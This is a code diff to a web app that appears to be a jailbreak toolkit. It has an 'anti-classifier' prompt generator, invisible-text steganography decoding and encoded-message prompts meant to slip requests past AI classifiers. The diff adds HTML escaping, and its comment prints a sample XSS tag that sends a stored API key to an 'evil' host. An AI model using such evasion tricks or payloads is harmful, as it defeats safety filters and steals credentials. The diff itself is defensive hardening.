@@ -1,6 +1,7 @@
 // Initialize Vue app
 window.app = new Vue({
     el: '#app',
+    mixins: [window.variationsVueMixin, window.aiSettingsVueMixin],   // js/variationsVue.js, js/aiSettingsVue.js
     data: {
         // Theme
         isDarkTheme: true,
@@ -1056,7 +1057,9 @@ Stable Diffusion Safety Research
             }
             
             // - Invisible text (only check if the input actually contains invisible characters)
-            if (/[\uE0000-\uE007F]/.test(input)) {
+            // 0xE00FF, not 0xE007F: the encoder maps UTF-8 BYTES to 0xE0000 +
+            // byte, so any non-ASCII payload produces bytes >= 0x80.
+            if (/[\u{E0000}-\u{E00FF}]/u.test(input)) {
                 let decoded = window.steganography.decodeInvisible(input);
                 if (decoded && decoded.length > 0) {
                     return { text: decoded, method: 'Invisible Text' };
@@ -2235,7 +2238,12 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
         },
         
         async generateAntiClassifierResponse() {
-            if (!this.openaiApiKey || !this.anticlassifierUserPrompt.trim()) {
+            if (!this.anticlassifierUserPrompt.trim()) {
+                this.anticlassifierError = 'Enter a prompt first.';
+                return;
+            }
+            if (!this.aiIsConfigured) {
+                this.anticlassifierError = 'No AI provider configured - set one up in the AI Settings tab.';
                 return;
             }
             
@@ -2244,14 +2252,14 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
             this.anticlassifierResponse = '';
             
             try {
-                const response = await fetch('https://api.openai.com/v1/chat/completions', {
+                const acHeaders = { 'Content-Type': 'application/json' };
+                if (this.openaiApiKey) acHeaders['Authorization'] = `Bearer ${this.openaiApiKey}`;
+
+                const response = await fetch(this.aiEndpoint, {
                     method: 'POST',
-                    headers: {
-                        'Authorization': `Bearer ${this.openaiApiKey}`,
-                        'Content-Type': 'application/json',
-                    },
+                    headers: acHeaders,
                     body: JSON.stringify({
-                        model: this.openaiModel,
+                        model: this.aiModel,
                         messages: [
                             {
                                 role: 'system',
@@ -2262,8 +2270,8 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
                                 content: this.anticlassifierUserPrompt
                             }
                         ],
-                        temperature: this.openaiTemperature,
-                        max_tokens: this.openaiMaxTokens
+                        temperature: this.aiTemperature,
+                        max_tokens: this.aiMaxTokens
                     })
                 });
                 
@@ -2277,7 +2285,7 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
                 if (data.choices && data.choices.length > 0) {
                     this.anticlassifierResponse = data.choices[0].message.content;
                 } else {
-                    throw new Error('No response generated from OpenAI API');
+                    throw new Error('The endpoint returned no completion.');
                 }
                 
             } catch (error) {
@@ -2290,7 +2298,24 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
         
         formatResponse(text) {
             if (!text) return '';
-            
+
+            // SECURITY: escape the model's output before any markdown runs.
+            //
+            // This result is rendered with v-html. The endpoint is configurable,
+            // so anything able to influence the response - a proxy, a gateway, a
+            // mistyped host, or a model talked into emitting HTML - could
+            // otherwise return
+            //     <img src=x onerror="fetch('//evil/?k='+localStorage.openai_api_key)">
+            // and read the stored API key out of this origin. Escaping first
+            // makes such a tag inert text; the markdown replacements below still
+            // produce their own tags, which is the intended formatting.
+            text = String(text)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+
             // Enhanced markdown to HTML conversion
             let html = text
                 // Handle code blocks first (before single backticks)
@@ -2652,7 +2677,25 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
             }
             this.textPayload = out;
             this.showNotification('<i class="fas fa-bomb"></i> Text payload generated', 'success');
-        }
+        },
+        // Set up paste event handlers for all textareas
+        setupPasteHandlers() {
+            // Get all textareas in the app
+            const textareas = document.querySelectorAll('textarea');
+        
+            // Add paste event listener to each textarea
+            textareas.forEach(textarea => {
+                textarea.addEventListener('paste', (e) => {
+                    // Mark this as an explicit paste event
+                    this.isPasteOperation = true;
+                
+                    // Reset the flag after a short delay
+                    setTimeout(() => {
+                        this.isPasteOperation = false;
+                    }, 100);
+                });
+            });
+        },
     },
     // Initialize theme and components
     mounted() {
@@ -2718,24 +2761,6 @@ Now, please translate and respond to this message in alphapr: ${encoded}`;
         });
     },
 
-    // Set up paste event handlers for all textareas
-    setupPasteHandlers() {
-        // Get all textareas in the app
-        const textareas = document.querySelectorAll('textarea');
-        
-        // Add paste event listener to each textarea
-        textareas.forEach(textarea => {
-            textarea.addEventListener('paste', (e) => {
-                // Mark this as an explicit paste event
-                this.isPasteOperation = true;
-                
-                // Reset the flag after a short delay
-                setTimeout(() => {
-                    this.isPasteOperation = false;
-                }, 100);
-            });
-        });
-    },
     // No keyboard shortcuts - they were removed as requested
     created() {
         // Initialize any required functionality
